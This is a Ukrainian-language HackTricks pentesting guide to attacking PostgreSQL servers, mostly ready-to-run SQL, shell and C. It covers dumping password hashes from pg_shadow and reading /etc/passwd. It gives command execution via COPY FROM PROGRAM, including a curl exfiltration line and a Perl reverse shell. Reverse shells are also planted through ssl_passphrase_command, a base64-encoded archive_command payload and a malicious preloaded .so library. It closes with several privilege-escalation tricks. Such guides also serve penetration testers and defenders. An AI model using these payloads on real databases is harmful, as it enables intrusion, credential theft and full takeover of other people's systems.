# 5432,5433 - Pentesting Postgresql

<figure><img src="../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql) для легкого створення та **автоматизації робочих процесів**, підтримуваних **найсучаснішими** інструментами спільноти.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}

{{#include ../banners/hacktricks-training.md}}

## **Основна інформація**

**PostgreSQL** описується як **об'єктно-реляційна система управління базами даних**, яка є **відкритим програмним забезпеченням**. Ця система не тільки використовує мову SQL, але й покращує її додатковими функціями. Її можливості дозволяють обробляти широкий спектр типів даних та операцій, що робить її універсальним вибором для розробників та організацій.

**Порт за замовчуванням:** 5432, і якщо цей порт вже використовується, здається, що postgresql використовуватиме наступний порт (ймовірно, 5433), який не використовується.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Підключення та базове перерахування
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Якщо при виконанні **`\list`** ви знайдете базу даних під назвою **`rdsadmin`**, ви знаєте, що ви всередині **AWS postgresql database**.

Для отримання додаткової інформації про **те, як зловживати базою даних PostgreSQL**, перевірте:

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Автоматична енумерація
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Брутфорс**](../generic-hacking/brute-force.md#postgresql)

### **Сканування портів**

Згідно з [**цією дослідженням**](https://www.exploit-db.com/papers/13084), коли спроба підключення не вдається, `dblink` викидає виключення `sqlclient_unable_to_establish_sqlconnection`, яке містить пояснення помилки. Приклади цих деталей наведені нижче.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Хост недоступний

`ДЕТАЛІ: не вдалося підключитися до сервера: Немає маршруту до хоста. Чи працює сервер на хості "1.2.3.4" і приймає TCP/IP з'єднання на порту 5678?`

- Порт закритий
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Порт відкритий
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
або
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Порт відкритий або фільтрований
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
У функціях PL/pgSQL наразі неможливо отримати деталі виключень. Однак, якщо у вас є прямий доступ до сервера PostgreSQL, ви можете отримати необхідну інформацію. Якщо витягти імена користувачів та паролі з системних таблиць неможливо, ви можете розглянути можливість використання методу атаки зі словником, обговореного в попередньому розділі, оскільки це може дати позитивні результати.

## Перерахування Привілеїв

### Ролі

| Типи Ролей     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Роль має привілеї суперкористувача                                                                                                                  |
| rolinherit     | Роль автоматично успадковує привілеї ролей, членом яких вона є                                                                                      |
| rolcreaterole  | Роль може створювати нові ролі                                                                                                                     |
| rolcreatedb    | Роль може створювати бази даних                                                                                                                    |
| rolcanlogin    | Роль може увійти в систему. Тобто, цю роль можна використовувати як початковий ідентифікатор авторизації сесії                                     |
| rolreplication | Роль є роллю реплікації. Роль реплікації може ініціювати з'єднання реплікації та створювати і видаляти слоти реплікації.                          |
| rolconnlimit   | Для ролей, які можуть увійти в систему, це встановлює максимальну кількість одночасних з'єднань, які може зробити ця роль. -1 означає без обмежень. |
| rolpassword    | Не пароль (завжди читається як `********`)                                                                                                          |
| rolvaliduntil  | Час закінчення дії пароля (використовується лише для аутентифікації за паролем); null, якщо немає терміну дії                                      |
| rolbypassrls   | Роль обходить кожну політику безпеки на рівні рядка, див. [Розділ 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) для отримання додаткової інформації. |
| rolconfig      | Специфічні для ролі значення за замовчуванням для змінних конфігурації під час виконання                                                          |
| oid            | ID ролі                                                                                                                                             |

#### Цікаві Групи

- Якщо ви є членом **`pg_execute_server_program`**, ви можете **виконувати** програми
- Якщо ви є членом **`pg_read_server_files`**, ви можете **читати** файли
- Якщо ви є членом **`pg_write_server_files`**, ви можете **писати** файли

> [!NOTE]
> Зверніть увагу, що в Postgres **користувач**, **група** та **роль** є **одним і тим же**. Це залежить від **того, як ви це використовуєте** і чи **дозволяєте їй входити в систему**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Таблиці
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Функції
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Дії з файловою системою

### Читання каталогів і файлів

З цього [**коміту**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) члени визначеної **`DEFAULT_ROLE_READ_SERVER_FILES`** групи (названої **`pg_read_server_files`**) та **суперкористувачі** можуть використовувати метод **`COPY`** на будь-якому шляху (перевірте `convert_and_check_filename` у `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Пам'ятайте, що якщо ви не є суперкористувачем, але маєте права **CREATEROLE**, ви можете **додати себе до цієї групи:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**Більше інформації.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Є **інші функції postgres**, які можна використовувати для **читання файлів або переліку директорій**. Тільки **суперкористувачі** та **користувачі з явними правами** можуть їх використовувати:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Ви можете знайти **більше функцій** в [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Просте записування файлів

Тільки **суперкористувачі** та члени **`pg_write_server_files`** можуть використовувати copy для запису файлів.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Пам'ятайте, що якщо ви не є суперкористувачем, але маєте права **`CREATEROLE`**, ви можете **додати себе до цієї групи:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**Більше інформації.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Пам'ятайте, що COPY не може обробляти символи нового рядка, тому навіть якщо ви використовуєте payload у base64, **вам потрібно надіслати однорядковий запит**.\
Дуже важливе обмеження цієї техніки полягає в тому, що **`copy` не може бути використаний для запису бінарних файлів, оскільки він змінює деякі бінарні значення.**

### **Завантаження бінарних файлів**

Однак існують **інші техніки для завантаження великих бінарних файлів:**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}

## <img src="../images/i3.png" alt="" data-size="original">

**Порада для баг-баунті**: **зареєструйтесь** на **Intigriti**, преміум **платформі для баг-баунті, створеній хакерами для хакерів**! Приєднуйтесь до нас на [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) сьогодні та почніть заробляти винагороди до **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### Оновлення даних таблиці PostgreSQL через запис локального файлу

Якщо у вас є необхідні права для читання та запису файлів сервера PostgreSQL, ви можете оновити будь-яку таблицю на сервері, **перезаписавши відповідний файл** у [каталозі даних PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **Більше про цю техніку** [**тут**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Необхідні кроки:

1.  Отримайте каталог даних PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Примітка:** Якщо ви не можете отримати поточний шлях до каталогу даних з налаштувань, ви можете запитати основну версію PostgreSQL через запит `SELECT version()` і спробувати перебрати шлях. Загальні шляхи до каталогу даних на Unix-інсталяціях PostgreSQL: `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Загальне ім'я кластера - `main`.

2.  Отримайте відносний шлях до файлу, пов'язаного з цільовою таблицею

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Цей запит має повернути щось на зразок `base/3/1337`. Повний шлях на диску буде `$DATA_DIRECTORY/base/3/1337`, тобто `/var/lib/postgresql/13/main/base/3/1337`.

3.  Завантажте файл через функції `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Отримайте тип даних, пов'язаний з цільовою таблицею

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Використовуйте [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) для [редагування файлу](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); встановіть всі булеві прапори `rol*` на 1 для повних прав.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Повторно завантажте відредагований файл через функції `lo_*` і перезапишіть оригінальний файл на диску

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Опціонально)_ Очистіть кеш таблиці в пам'яті, запустивши витратний SQL-запит

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Тепер ви повинні бачити оновлені значення таблиці в PostgreSQL.

Ви також можете стати суперадміністратором, редагуючи таблицю `pg_authid`. **Дивіться** [**наступний розділ**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE до програми**

Оскільки [версія 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), тільки **суперкористувачі** та члени групи **`pg_execute_server_program`** можуть використовувати copy для RCE (приклад з ексфільтрацією:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Приклад для виконання:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Пам'ятайте, що якщо ви не є суперкористувачем, але маєте права **`CREATEROLE`**, ви можете **додати себе до цієї групи:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Більше інформації.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Або використовуйте модуль `multi/postgres/postgres_copy_from_program_cmd_exec` з **metasploit**.\
Більше інформації про цю вразливість [**тут**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Хоча це було зареєстровано як CVE-2019-9193, Postges оголосив, що це [функція і не буде виправлено](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE з PostgreSQL мовами

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE з розширеннями PostgreSQL

Якщо ви **навчилися** з попереднього посту **як завантажувати бінарні файли**, ви можете спробувати отримати **RCE, завантажуючи розширення postgresql і завантажуючи його**.

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE з конфігураційного файлу PostgreSQL

> [!NOTE]
> Наступні вектори RCE особливо корисні в обмежених контекстах SQLi, оскільки всі кроки можуть бути виконані через вкладені оператори SELECT

**Конфігураційний файл** PostgreSQL є **записуваним** користувачем **postgres**, який запускає базу даних, тому як **суперкористувач**, ви можете записувати файли в файловій системі, і, отже, ви можете **перезаписати цей файл.**

![](<../images/image (322).png>)

#### **RCE з ssl_passphrase_command**

Більше інформації [про цю техніку тут](https://pulsesecurity.co.nz/articles/postgres-sqli).

Конфігураційний файл має деякі цікаві атрибути, які можуть призвести до RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Шлях до приватного ключа бази даних
- `ssl_passphrase_command = ''` Якщо приватний файл захищений паролем (шифрований), postgresql **виконає команду, вказану в цьому атрибуті**.
- `ssl_passphrase_command_supports_reload = off` **Якщо** цей атрибут **включений**, **команда**, що виконується, якщо ключ захищений паролем, **буде виконана**, коли `pg_reload_conf()` буде **виконано**.

Отже, зловмиснику потрібно буде:

1. **Скинути приватний ключ** з сервера
2. **Зашифрувати** завантажений приватний ключ:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Перезаписати**
4. **Скинути** поточну **конфігурацію postgresql**
5. **Перезаписати** **конфігурацію** з вказаними атрибутами:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Виконати `pg_reload_conf()`

Під час тестування я помітив, що це буде працювати лише якщо **файл приватного ключа має привілеї 640**, він **належить root** і **групі ssl-cert або postgres** (щоб користувач postgres міг його читати), і розташований у _/var/lib/postgresql/12/main_.

#### **RCE з archive_command**

**Більше** [**інформації про цю конфігурацію та про WAL тут**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Ще один атрибут у конфігураційному файлі, який можна експлуатувати, це `archive_command`.

Для цього `archive_mode` має бути `'on'` або `'always'`. Якщо це правда, тоді ми можемо перезаписати команду в `archive_command` і змусити її виконатися через операції WAL (журнал попереднього запису).

Загальні кроки:

1. Перевірте, чи увімкнено режим архівування: `SELECT current_setting('archive_mode')`
2. Перезапишіть `archive_command` з корисним навантаженням. Наприклад, зворотний шелл: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Перезавантажте конфігурацію: `SELECT pg_reload_conf()`
4. Примусьте операцію WAL виконатися, що викличе команду архівування: `SELECT pg_switch_wal()` або `SELECT pg_switch_xlog()` для деяких версій Postgres

#### **RCE з попередньо завантаженими бібліотеками**

Більше інформації [про цю техніку тут](https://adeadfed.com/posts/postgresql-select-only-rce/).

Цей вектор атаки використовує наступні змінні конфігурації:

- `session_preload_libraries` -- бібліотеки, які будуть завантажені сервером PostgreSQL під час підключення клієнта.
- `dynamic_library_path` -- список директорій, де сервер PostgreSQL буде шукати бібліотеки.

Ми можемо встановити значення `dynamic_library_path` на директорію, доступну для запису користувачем `postgres`, що запускає базу даних, наприклад, директорію `/tmp/`, і завантажити туди шкідливий об'єкт `.so`. Далі ми примусимо сервер PostgreSQL завантажити нашу нову бібліотеку, включивши її в змінну `session_preload_libraries`.

Кроки атаки:

1. Завантажте оригінальний `postgresql.conf`
2. Включіть директорію `/tmp/` у значення `dynamic_library_path`, наприклад, `dynamic_library_path = '/tmp:$libdir'`
3. Включіть ім'я шкідливої бібліотеки в значення `session_preload_libraries`, наприклад, `session_preload_libraries = 'payload.so'`
4. Перевірте основну версію PostgreSQL за допомогою запиту `SELECT version()`
5. Скомпілюйте код шкідливої бібліотеки з правильним пакетом розробника PostgreSQL Приклад коду:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
код взятий з https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Компілірування коду:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Завантажте шкідливий `postgresql.conf`, створений на етапах 2-3, і перезапишіть оригінальний
7. Завантажте `payload.so` з етапу 5 у директорію `/tmp`
8. Перезавантажте конфігурацію сервера, перезапустивши сервер або викликавши запит `SELECT pg_reload_conf()`
9. При наступному підключенні до БД ви отримаєте зворотне з'єднання шеллу.

## **Підвищення привілеїв Postgres**

### Підвищення привілеїв CREATEROLE

#### **Надання**

Згідно з [**документацією**](https://www.postgresql.org/docs/13/sql-grant.html): _Ролі, які мають привілей **`CREATEROLE`**, можуть **надавати або відкликати членство в будь-якій ролі**, яка **не є** **суперкористувачем**._

Отже, якщо у вас є дозвіл **`CREATEROLE`**, ви можете надати собі доступ до інших **ролей** (які не є суперкористувачами), що можуть дати вам можливість читати та записувати файли та виконувати команди:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Змінити пароль

Користувачі з цією роллю також можуть **змінювати** **паролі** інших **не-суперкористувачів**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc до SUPERUSER

Досить поширено, що **локальні користувачі можуть входити в PostgreSQL без надання будь-якого пароля**. Тому, як тільки ви отримали **дозволи на виконання коду**, ви можете зловживати цими дозволами, щоб надати собі роль **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!NOTE]
> Це зазвичай можливо через наступні рядки у файлі **`pg_hba.conf`**:
>
> ```bash
> # "local" призначений тільки для з'єднань через сокети Unix
> local   all             all                                     trust
> # IPv4 локальні з'єднання:
> host    all             all             127.0.0.1/32            trust
> # IPv6 локальні з'єднання:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

У [**цьому звіті**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) пояснюється, як було можливе **privesc** у Postgres GCP, зловживаючи привілеєм ALTER TABLE, який був наданий користувачу.

Коли ви намагаєтеся **зробити іншого користувача власником таблиці**, ви повинні отримати **помилку**, яка цьому заважає, але, очевидно, GCP надав цю **опцію не-суперкористувачу postgres** у GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Поєднуючи цю ідею з тим фактом, що коли команди **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) виконуються на **таблиці з функцією індексу**, **функція** **викликається** як частина команди з **дозволами** **власника таблиці**. Можливо створити індекс з функцією і надати дозволи власника **суперкористувачу** над цією таблицею, а потім виконати ANALYZE над таблицею з шкідливою функцією, яка зможе виконувати команди, оскільки використовує привілеї власника.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Експлуатація

1. Почніть з створення нової таблиці.
2. Вставте деякий нерелевантний контент у таблицю, щоб надати дані для функції індексації.
3. Розробіть шкідливу функцію індексації, яка містить код виконання, що дозволяє виконувати несанкціоновані команди.
4. Змініть власника таблиці на "cloudsqladmin", що є роллю суперкористувача GCP, яка використовується виключно Cloud SQL для управління та обслуговування бази даних.
5. Виконайте операцію ANALYZE на таблиці. Ця дія змушує движок PostgreSQL переключитися на контекст користувача власника таблиці, "cloudsqladmin". Внаслідок цього шкідлива функція індексації викликається з правами "cloudsqladmin", що дозволяє виконання раніше несанкціонованої команди оболонки.

У PostgreSQL цей процес виглядає приблизно так:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Тоді таблиця `shell_commands_results` міститиме вихідні дані виконаного коду:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Локальний вхід

Деякі неправильно налаштовані екземпляри postgresql можуть дозволяти вхід будь-якого локального користувача, можливо локально з 127.0.0.1, використовуючи **`dblink` функцію**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Зверніть увагу, що для роботи попереднього запиту **функція `dblink` повинна існувати**. Якщо її немає, ви можете спробувати створити її за допомогою
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Якщо у вас є пароль користувача з більшими привілеями, але користувач не може увійти з зовнішньої IP-адреси, ви можете використовувати наступну функцію для виконання запитів від імені цього користувача:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Можна перевірити, чи існує ця функція за допомогою:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Користувацька функція з** SECURITY DEFINER

[**У цьому звіті**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql) пентестери змогли підвищити привілеї всередині екземпляра postgres, наданого IBM, оскільки вони **знайшли цю функцію з прапором SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Як [**пояснено в документації**](https://www.postgresql.org/docs/current/sql-createfunction.html), функція з **SECURITY DEFINER виконується** з привілеями **користувача, який її володіє**. Тому, якщо функція **вразлива до SQL-ін'єкцій** або виконує деякі **привілейовані дії з параметрами, контрольованими атакуючим**, її можна зловживати для **ескалації привілеїв всередині postgres**.

У рядку 4 попереднього коду ви можете побачити, що функція має прапор **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
І потім **виконати команди**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Брутфорс паролів з PL/pgSQL

**PL/pgSQL** - це **повнофункціональна мова програмування**, яка пропонує більший процедурний контроль у порівнянні з SQL. Вона дозволяє використовувати **цикли** та інші **структури управління** для покращення логіки програми. Крім того, **SQL-інструкції** та **тригери** мають можливість викликати функції, створені за допомогою **мови PL/pgSQL**. Ця інтеграція дозволяє більш комплексний і універсальний підхід до програмування бази даних та автоматизації.\
**Ви можете зловживати цією мовою, щоб попросити PostgreSQL брутфорсити облікові дані користувачів.**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Привілеї через перезапис внутрішніх таблиць PostgreSQL

> [!NOTE]
> Наступний вектор привілеїв особливо корисний у обмежених контекстах SQLi, оскільки всі кроки можна виконати через вкладені оператори SELECT

Якщо ви можете **читати та записувати файли сервера PostgreSQL**, ви можете **стати суперкористувачем**, перезаписавши файловий вузол PostgreSQL на диску, пов'язаний з внутрішньою таблицею `pg_authid`.

Дізнайтеся більше про **цю техніку** [**тут**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Кроки атаки:

1. Отримати каталог даних PostgreSQL
2. Отримати відносний шлях до файлового вузла, пов'язаного з таблицею `pg_authid`
3. Завантажити файловий вузол через функції `lo_*`
4. Отримати тип даних, пов'язаний з таблицею `pg_authid`
5. Використати [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) для [редагування файлового вузла](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); встановити всі булеві прапорці `rol*` на 1 для повних прав.
6. Повторно завантажити відредагований файловий вузол через функції `lo_*` і перезаписати оригінальний файл на диску
7. _(Опційно)_ Очистити кеш таблиці в пам'яті, запустивши витратний SQL-запит
8. Тепер ви повинні мати привілеї повного супер адміністратора.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

